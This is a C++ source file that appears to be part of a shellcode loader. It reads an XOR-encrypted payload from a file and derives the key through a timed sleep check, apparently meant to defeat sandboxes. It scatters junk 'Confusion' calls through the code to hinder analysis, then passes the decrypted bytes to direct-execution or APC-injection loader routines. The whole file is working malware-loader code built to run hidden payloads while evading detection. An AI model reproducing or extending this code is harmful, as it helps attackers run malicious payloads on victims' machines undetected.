//
// Created by au9u5t on 24-9-30.
//

#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include "Launch.h"



void Launch::au9u5tDecrypt() {
    std::ifstream inputFile{this->filePath, std::ios::binary};
    if (!inputFile) {
        std::cout << "Failed to open file!" << std::endl;
        return;
    }

    std::string encryptedData{std::istreambuf_iterator<char>(inputFile), std::istreambuf_iterator<char>()};
    inputFile.close();

    this->sleepTime = Cryptography::generateKey();
    this->minValue = this->sleepTime * 1000 - 500;
    this->maxValue = this->sleepTime * 1000 + 500;


    auto start_time = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(this->sleepTime * 1000));
    auto end_time = std::chrono::high_resolution_clock::now();

    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    auto time_diff = elapsed_time.count();


    auto i{this->NUMBER_OF_CYCLES};
    while (i--) {
        if (method == "6N_XOR") {
            this->func6N_XORPrep();
            auto diff{demo - time_diff};
            this->func6N_XOR(diff, encryptedData);
        } else if (method == "file_XOR") {
            this->funcFile_XOR(encryptedData);
        } else {
            std::cout << "Invalid encryption method!" << std::endl;
        }
        break;
    }
}

void Launch::func6N_XORPrep() {
    int intKey;
    try {
        intKey = std::stoi(key);
    }
    catch (std::invalid_argument &e) {
        std::cout << "Invalid key! key must be a number, and 6 digits long. your key: " << key << std::endl;
        return;
    }
    catch (std::out_of_range &e) {
        std::cout << "Key out of range!" << std::endl;
        return;
    } catch (...) {
        std::cout << "Invalid key!" << std::endl;
        return;
    }

    this->lessThan = intKey - 1;
    this->greaterThan = intKey + 1;
    this->demo = intKey;
}

void Launch::func6N_XOR(long long int &diff, std::string &encryptedData) {
    auto randomValue{Cryptography::decryptKey(diff, this->minValue, this->maxValue, this->lessThan, this->greaterThan)};

    if (lessThan < randomValue && randomValue < greaterThan) {
        auto randKey = std::to_string(randomValue);

        Confusion::generateAndSortArray();
        auto decryptedDate{Cryptography::x_o_r_EncryptDecrypt(encryptedData, randKey)};

        Confusion::generateAndSortArray();
        const auto *decryptedData = reinterpret_cast<const unsigned char *>(decryptedDate.c_str());
        auto byteLength = decryptedDate.length();

        this->launchFunction(function_mode, decryptedData, byteLength);
    }
}

void Launch::funcFile_XOR(string &encryptedData) {
    std::ifstream keyFile{key, std::ios::binary};
    if (!keyFile) {
        std::cout << "Failed to open key file!" << std::endl;
        return;
    }

    std::string keyData{std::istreambuf_iterator<char>(keyFile), std::istreambuf_iterator<char>()};
    keyFile.close();

    Confusion::generateAndSortArray();
    auto decryptedDate{Cryptography::x_o_r_EncryptDecrypt(encryptedData, keyData)};
    Confusion::generateAndSortArray();
    const auto *decryptedData = reinterpret_cast<const unsigned char *>(decryptedDate.c_str());
    auto byteLength = decryptedDate.length();

    this->launchFunction(function_mode, decryptedData, byteLength);


}

void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
    if (function_mode == "1") {
        Confusion::generateAndSortArray();
        this->printMode("Function 1");
        this->startBase(MasterEncoderForDirectlyLoader::function1, decryptedData, byteLength);
        Confusion::generateAndSortArray();

    } else if (function_mode == "2") {
        Confusion::generateAndSortArray();
        this->printMode("Function 2");
        this->startBase(MasterEncoderForApcLoadder::function1, decryptedData, byteLength);
        Confusion::generateAndSortArray();
    } else {
        std::cout << "Invalid function mode!" << std::endl;
        return;
    }
}

void Launch::printMode(const string &mode) {
    std::cout << "in function: " << mode << std::endl;
}

void Launch::startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength) {
    MasterEncoderForApcLoadder::generateAndSortArray();
    Confusion::generateAndSortArray();
    Confusion::generateAndTransformArray();
    startFunction(decryptedData, byteLength);
    Confusion::generateAndSortArray();
    Confusion::generateAndTransformArray();
    MasterEncoderForApcLoadder::generateAndSortArray();

}
